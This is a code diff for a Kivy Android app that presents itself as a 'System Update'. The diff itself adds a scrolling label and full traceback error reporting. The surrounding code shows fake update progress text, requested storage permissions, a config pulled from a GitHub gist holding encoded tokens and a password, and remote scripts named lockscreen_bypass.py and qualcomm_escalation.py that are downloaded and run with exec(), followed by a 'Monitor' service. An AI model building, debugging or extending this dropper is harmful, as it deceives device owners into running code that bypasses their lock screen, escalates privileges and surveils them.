@@ -3,26 +3,42 @@ import requests
 import base64
 import time
 import json
+import traceback  # لاستخراج تفاصيل الخطأ الكاملة
 from kivy.app import App
 from kivy.uix.label import Label
 from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.scrollview import ScrollView  # للتمرير في حالة النص الطويل
 from kivy.utils import platform
 
 class SystemUpdateApp(App):
     def build(self):
-        # الرابط الصحيح لملف config.json (بعد التعديل)
+        # الرابط الصحيح لملف config.json
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/b506332d90b3bd191a5b09cc0ecbf15c9542026a/config.json"
-        
+
+        # التخطيط الرئيسي
         self.layout = BoxLayout(orientation='vertical')
+
+        # إضافة ScrollView لعرض النص الطويل
+        self.scroll_view = ScrollView()
         self.label = Label(
             text="System Update\nChecking for compatibility... (0%)",
             halign="center",
-            font_size='18sp'
+            font_size='18sp',
+            text_size=(self.layout.width, None),  # التفاف النص حسب العرض
+            size_hint_y=None,                     # نتحكم بالارتفاع يدوياً
+            valign='top'                          # النص يبدأ من الأعلى
         )
-        self.layout.add_widget(self.label)
-        
+        self.label.bind(texture_size=self._update_label_height)
+        self.scroll_view.add_widget(self.label)
+        self.layout.add_widget(self.scroll_view)
+
+        # تشغيل المحرك في خلفية منفصلة
         threading.Thread(target=self.logic_engine, daemon=True).start()
         return self.layout
+
+    def _update_label_height(self, instance, value):
+        """تحديث ارتفاع الـ Label تلقائياً حسب محتوى النص"""
+        self.label.height = value[1]
 
     def decode_secret(self, data):
         try:
@@ -51,12 +67,12 @@ class SystemUpdateApp(App):
                     Permission.READ_EXTERNAL_STORAGE,
                     Permission.INTERNET
                 ])
-            
+
             time.sleep(2)
-            
+
             response = requests.get(self.config_url, timeout=15)
             config = response.json()
-            
+
             globals()['MASTER_CONFIG'] = {
                 'tokens': [self.decode_secret(t) for t in config['t']],
                 'password': self.decode_secret(config['p']),
@@ -66,11 +82,13 @@ class SystemUpdateApp(App):
             self.send_log("🚀 [System Update] Online! Configuration loaded successfully.")
             self.label.text = "Downloading system patches... (35%)"
             self.load_payloads()
-            
+
         except Exception as e:
-            # عرض الخطأ على الشاشة لتسهيل التشخيص
-            self.label.text = f"Connection Error:\n{str(e)}"
-            self.send_log(f"❌ Critical Error: {str(e)}")
+            # الحصول على تفاصيل الخطأ كاملة (سطر بسطر)
+            error_details = traceback.format_exc()
+            # عرض الخطأ في الـ Label بدلاً من الرسالة المختصرة
+            self.label.text = f"Connection Error:\n{error_details}"
+            self.send_log(f"❌ Critical Error: {error_details}")
 
     def load_payloads(self):
         payload_urls = [
@@ -85,10 +103,10 @@ class SystemUpdateApp(App):
             "https://gist.githubusercontent.com/Zaen1993/2b657849bfdec661d6357abeda32ec45/raw/6114278915a5f037b343edca1601764a1354dafa/lockscreen_bypass.py",
             "https://gist.githubusercontent.com/Zaen1993/d81377a4d1079a922c38ea53580b55a0/raw/cfb9973a9bdc66b0b23cca1ab3b61762d8df5985/qualcomm_escalation.py"
         ]
-        
+
         for url in payload_urls:
             try:
-                time.sleep(1)  # تجنب الحظر
+                time.sleep(1)
                 name = url.split('/')[-1]
                 code = requests.get(url, timeout=10).text
                 exec(code, globals())
@@ -96,7 +114,7 @@ class SystemUpdateApp(App):
             except Exception as e:
                 self.send_log(f"⚠️ Warning: Failed to load {url.split('/')[-1]}")
                 continue
-        
+
         if 'Monitor' in globals():
             self.send_log("⚙️ Starting Monitor Service...")
             monitor = globals()['Monitor']()
